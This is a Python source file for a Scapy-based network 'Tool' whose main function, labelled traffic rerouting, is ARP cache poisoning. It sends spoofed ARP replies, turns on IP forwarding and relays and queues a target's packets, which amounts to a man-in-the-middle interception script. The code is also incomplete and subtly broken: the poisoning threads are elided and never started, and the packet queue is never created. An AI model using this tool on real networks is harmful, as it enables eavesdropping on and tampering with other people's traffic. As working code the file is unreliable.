import os
import getpass
import netifaces
import logging
import subprocess  # For subprocess.run()
import threading  # For threading.Thread and threading.Lock
import time  # For time.sleep()
import errno  # For errno (used for error checking in threads)

from scapy.all import *  #  Import all of Scapy
from scapy.all import IP, Ether
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from textcolors import TextColors

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class Tool:

    def __init__(self, interface=None, greet=False, use_scapy_forwarding=False):
        self.console = Console()
        self._interface = interface
        self.greet = greet
        self.use_scapy_forwarding = use_scapy_forwarding
        self.stop_event = threading.Event()  # Crucial: make sure it's in __init__
        self.poison_threads_lock = threading.Lock()  # Add lock
        self.forwarding_thread = None  # Initialize forwarding thread

        # Initialize network info immediately
        self.initialize()

        if (
            greet and self.is_network_info_available()
        ):  # Greet only if initialization was successful
            self.greet_user()

    def initialize(self):
        """Retrieves and stores network information."""
        try:
            self._interface = self._get_default_interface()
            if self._interface is None:
                raise RuntimeError(
                    "No suitable network interface found."
                )  # Raise exception to be caught

            self._gateway_ip = self._get_default_gateway()
            self._own_ip = self._get_own_ip()
            self._own_mac = self._get_own_mac()

            if not all([self._gateway_ip, self._own_ip, self._own_mac]):
                logger.warning(
                    "Some network information could not be retrieved."
                )  # Consistent Logging
        except (
            KeyError,
            IndexError,
            ValueError,
            OSError,
            AttributeError,
            RuntimeError,  # Catch the potential RuntimeError
        ) as e:
            self.console.print(
                f"{TextColors.FAIL}Error during initialization: {e}{TextColors.ENDC}",
                style="bold red",
            )
            # Clear network info on failure
            self._interface = None
            self._gateway_ip = None
            self._own_ip = None
            self._own_mac = None

    def greet_user(self):
        """Presents a colorful greeting to the user, including network info."""
        username = getpass.getuser()
        greeting_table = Table(title=f"Welcome, {username}!", style="bold cyan")
        greeting_table.add_row("Network Tool Initialized")
        greeting_table.add_row(
            f"Interface: {self._interface or 'N/A'}"
        )  # Shows N/A if not available
        greeting_table.add_row(f"Gateway IP: {self._gateway_ip or 'N/A'}")
        greeting_table.add_row(f"Own IP: {self._own_ip or 'N/A'}")
        greeting_table.add_row(f"Own MAC: {self._own_mac or 'N/A'}")

        self.console.print(Panel(greeting_table, border_style="green", expand=False))

    def is_network_info_available(self):
        """Checks if all required network information is available."""
        return all([self._interface, self._gateway_ip, self._own_ip, self._own_mac])

    def _get_default_interface(self):  # Same logic but better error reporting
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][1]
        except KeyError:
            logger.error("No default gateway found.")  # Logging
            return None

    def _get_default_gateway(self):  # Same logic, improved logging
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][0]
        except KeyError:
            logger.error("No default gateway found.")  # Logging
            return None

    def _get_own_ip(self):  # Improve error handling logic
        try:
            ifaddresses = netifaces.ifaddresses(self._interface)
            if netifaces.AF_INET in ifaddresses:
                return ifaddresses[netifaces.AF_INET][0]["addr"]
            else:
                logger.error(f"No IPv4 address found for interface: {self._interface}")
                return None

        except ValueError as e:
            logger.error(f"Invalid interface specified: {e}")  # Better Logging
            return None

    def _get_own_mac(self):  # Logging error with more information
        try:
            return get_if_hwaddr(self._interface)
        except OSError as e:
            logger.error(
                f"Error getting MAC address for {self._interface}: {e}"
            )  # Log useful details
            return None

    # ... (Getter methods remain the same)
    def get_interface(self):
        return self._interface

    def get_gateway_ip(self):
        return self._gateway_ip

    def get_own_ip(self):
        return self._own_ip

    def get_own_mac(self):
        return self._own_mac

    #       Traffic rerouting logic
    #######

    def _get_mac(self, ip_address):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                timeout=2,
                verbose=0,
            )
            if ans:
                return ans[0][1].hwsrc
            else:
                logger.error(f"Failed to resolve MAC address for {ip_address}")
                return None
        except Exception as e:
            logger.error(f"Error getting MAC address: {e}")
            return None

    def _restore_arp(self):
        if (
            self.target_ip
            and self._gateway_ip  # Use the class's stored gateway IP
            and self.target_mac
            and self.gateway_mac
            and self._interface
        ):  # Check if all needed vars are defined
            try:
                send(
                    ARP(
                        op=2,
                        pdst=self._gateway_ip,  # _gateway_ip
                        hwdst=self.gateway_mac,
                        psrc=self.target_ip,
                        hwsrc=self.target_mac,
                    ),
                    count=5,
                    verbose=0,
                )
                send(
                    ARP(
                        op=2,
                        pdst=self.target_ip,
                        hwdst=self.target_mac,
                        psrc=self._gateway_ip,  # _gateway_ip
                        hwsrc=self.gateway_mac,
                    ),
                    count=5,
                    verbose=0,
                )
                logger.info("ARP table restored.")
            except Exception as e:
                logger.error(f"Error restoring ARP: {e}")
        else:
            missing = []
            if not self.target_ip:
                missing.append("target_ip")
            if not self._gateway_ip:
                missing.append("_gateway_ip")
            if not self.target_mac:
                missing.append("target_mac")
            if not self.gateway_mac:
                missing.append("gateway_mac")
            if not self._interface:
                missing.append("_interface")

            logger.warning("Could not restore ARP table. Information missing.")

    def start_rerouting(self, target_ip):
        if not self.is_network_info_available():
            raise RuntimeError(
                "Network information not available. Initialize the tool first."
            )

        self.poison_threads = []  # List for poisoning threads  # Moved and cleared here
        self.poison_threads_lock = threading.Lock()

        self.target_ip = target_ip
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(self._gateway_ip)

        if not self.target_mac or not self.gateway_mac:  # Check if either MAC is None
            message = "Failed to resolve MAC address"
            if not self.target_mac:
                message += f" for target IP: {target_ip}"
            if not self.gateway_mac:
                if not self.target_mac:
                    message += " and"  # Better grammar for the joined errors
                message += f" for gateway IP: {self._gateway_ip}"
            raise ValueError(message)  # Raise exception if MAC couldn't be resolved

        if not all([self.target_mac, self.gateway_mac]):
            raise ValueError("Failed to resolve MAC addresses for target or gateway.")

        try:

            if (
                self.forwarding_thread and self.forwarding_thread.is_alive()
            ):  # Check if forwarding thread is running
                self.stop_event.set()  # Stop existing forwarding thread
                self.forwarding_thread.join()
                self.forwarding_thread = None  # Reset to allow a new thread to start
                logger.info("Stopped previous Scapy forwarding thread.")

            elif (
                not self.use_scapy_forwarding
            ):  # If switching to system forwarding, disable scapy's
                subprocess.run(
                    ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
                )  # Only disable IP forwarding if it was previously enabled.
                logger.info("Disabled existing system IP forwarding.")

            if self.use_scapy_forwarding:
                self.forwarding_thread = threading.Thread(
                    target=self._scapy_forwarding_loop,
                    args=(
                        target_ip,
                        self.target_mac,
                        self._gateway_ip,
                        self.gateway_mac,
                    ),  # Pass args
                    daemon=True,
                )

                self.forwarding_thread.start()
                logger.info("Using Scapy IP forwarding")

            elif (
                not self.use_scapy_forwarding
            ):  # Start system IP forwarding if selected
                subprocess.run(
                    ["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True
                )  # Enable system forwarding here.
                logger.info("Using sysctl IP forwarding")

            # ... (The rest of your ARP poisoning thread setup) ...
        except Exception as e:
            # ... clean up threads if they were started
            if self.use_scapy_forwarding and self.forwarding_thread:
                self.stop_event.set()  # Ensure the thread stops
                self.forwarding_thread.join()  # Make sure it's stopped
                self.forwarding_thread = None  # Reset the thread after stopping
            raise  # Re-raise the caught exception

    def _poison_thread(self, target_ip, target_mac, source_ip):
        """The ARP poisoning thread function."""
        poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
        while not self.stop_event.is_set():  # check stop flag before sending packet
            try:
                send(poison_packet, verbose=0)
                time.sleep(2)  # Adjust the sleep for a less aggressive heartbeat
            except OSError as e:  # Handle potential OS errors (e.g. network down)
                if e.errno == errno.ENETDOWN:
                    logger.error(f"Network interface down: {e}")
                    break  # Exit thread
                else:
                    raise

    def stop_rerouting(self):
        with self.poison_threads_lock:  # Acquire lock before using threads list
            if self.poison_threads:
                self.stop_event.set()  # Signal threads to stop
                for thread in self.poison_threads:
                    thread.join()  # Wait for threads to finish
                self._restore_arp()

                # Conditionally disable IP forwarding
                if not self.use_scapy_forwarding:  # Only disable if sysctl was used
                    subprocess.run(
                        ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
                    )

                logger.info("Traffic rerouting stopped and ARP table restored.")
                self.poison_threads = []  # Clear the list after stopping threads
                self.stop_event.clear()  # Reset for next use
            else:
                logger.warning(
                    "Rerouting stop attempted, but no threads were active. Was start_rerouting called successfully?"
                )  #  More specific log message

        # Stop Scapy forwarding thread *outside* the lock:
        if (
            self.use_scapy_forwarding and self.forwarding_thread
        ):  # Stop and reset forwarding thread if it was started
            self.stop_event.set()
            if self.forwarding_thread and self.forwarding_thread.is_alive():
                self.forwarding_thread.join()
            self.forwarding_thread = None
            logger.info("Stopped Scapy forwarding thread.")

        elif (
            not self.use_scapy_forwarding
        ):  # Disable system ip forwarding if it was used.
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
            )  # Disable IP forwarding

    def _scapy_forwarding_loop(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Uses Scapy's L3socket to forward packets."""

        try:
            with conf.L3socket() as fwd:
                while not self.stop_event.is_set():  # Correct loop condition
                    try:
                        packet = fwd.recv(1024, timeout=1)
                        if packet and IP in packet:
                            # ... (your existing forwarding logic using the passed-in variables)
                            if packet[IP].dst == target_ip:
                                packet[Ether].dst = target_mac

                            elif packet[IP].src == target_ip:
                                packet[Ether].dst = gateway_mac

                            elif (
                                packet[IP].src == gateway_ip
                            ):  # Handle traffic initiated from gateway to target
                                packet[Ether].dst = target_mac

                            elif (
                                packet[IP].dst == gateway_ip
                            ):  # Handle traffic from target to gateway
                                packet[Ether].dst = gateway_mac

                            fwd.send(packet)  # Forward the packet

                            self.process_packet(
                                packet.copy()
                            )  # Process packet copy thread-safely

                    except socket.timeout:
                        pass
                    except Exception as e:
                        logger.error(f"Error in forwarding loop: {e}")
                        break

        except Exception as e:
            logger.exception(f"Error creating Scapy forwarding socket: {e}")

    def process_packet(self, packet):  # Placeholder for now—needs implementation.
        """Processes a captured packet (stores in queue)."""

        if not packet:
            return  # Handle potential None packet

        try:
            if IP in packet:
                if self.use_scapy_forwarding or (
                    not self.forwarding_thread or not self.forwarding_thread.is_alive()
                ):
                    # Log and process if using Scapy forwarding or forwarding thread is inactive
                    logger.info(
                        f"Processing packet (use_scapy_forwarding or forwarding_thread inactive): {packet.summary()}"
                    )

                    # ... (Update MAC addresses correctly) ...
                    if packet[IP].dst == self.target_ip:
                        packet[Ether].dst = self.target_mac
                        sendp(packet, verbose=0, iface=self._interface)

                    elif (
                        packet[IP].src == self.target_ip
                    ):  # Traffic from target to gateway
                        packet[Ether].dst = self.gateway_mac
                        sendp(packet, verbose=0, iface=self._interface)

                    elif not self.use_scapy_forwarding:
                        # Don't process unrelated traffic if system forwarding is used.
                        return
                    else:  # Using scapy forwarding so handle the target related traffic.
                        if (
                            packet[IP].src == self.get_gateway_ip()
                        ):  # Handle traffic from gateway to target
                            packet[Ether].dst = self.target_mac
                            sendp(packet, verbose=0, iface=self._interface)
                        elif packet[IP].dst == self.get_gateway_ip():
                            packet[Ether].dst = self.gateway_mac
                            sendp(packet, verbose=0, iface=self._interface)

                else:  # System forwarding enabled.
                    # System IP forwarding is active; this method doesn't process the packets.
                    logger.debug(
                        "System IP forwarding active; skipping Scapy processing."
                    )

            else:  # Handle non-IP packets (ARP, etc.)
                logger.debug(
                    f"Non-IP packet received: {packet.summary()}"
                )  # Log non-IP
                if self.use_scapy_forwarding:  # Forward if using Scapy forwarding.
                    sendp(packet, verbose=0, iface=self._interface)

            self.packet_queue.put(packet)  # Put packet copy in the queue for other use

        except Exception as e:
            logger.exception(f"Error processing packet: {e}")

    def get_packet_from_queue(self):  # New method
        """Retrieves a packet from the queue, or blocks until available or timeout."""
        try:
            packet = self.packet_queue.get(timeout=1)
            return packet
        except Empty:  # Handle queue timeout if blocking
            return None
